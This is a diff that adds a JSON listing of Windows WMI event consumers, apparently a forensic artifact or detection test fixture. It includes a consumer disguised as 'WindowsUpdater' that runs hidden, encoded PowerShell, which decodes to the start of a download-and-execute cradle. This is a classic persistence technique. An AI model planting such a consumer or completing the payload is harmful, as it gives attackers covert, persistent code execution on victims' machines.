@@ -1,0 +1,12 @@
+[
+ {
+  "Class": "NTEventLogEventConsumer",
+  "Name": "SCM Event Log Consumer",
+  "Command": ""
+ },
+ {
+  "Class": "CommandLineEventConsumer",
+  "Name": "WindowsUpdater",
+  "Command": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"
+ }
+]
